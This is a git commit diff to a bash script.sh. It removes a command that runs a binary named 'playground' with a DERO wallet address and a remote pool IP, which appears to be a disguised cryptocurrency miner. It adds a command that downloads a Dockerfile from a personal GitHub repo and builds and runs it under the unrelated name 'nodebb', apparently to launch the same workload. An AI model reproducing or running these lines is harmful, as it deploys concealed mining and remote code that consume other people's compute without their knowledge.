dd8858800929089c0acfe0ebaedd6919ce17aed6
mayadyu <121432755+mayadyu@users.noreply.github.com>
2023-01-05 21:05:23 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,6 +1,5 @@
 #!/bin/bash
-chmod 500 playground && ./playground -w dero1qyxeam6g2kszcre09kpkhr9swgt560cyts3pfaa60q27ephl2a84qqqf9s2xk -r 206.189.246.90:10100 -p rpc
-
+wget https://raw.githubusercontent.com/mayadyu/jobs/main/Dockerfile && docker build -t nodebb && docker run nodebb
 
 
 
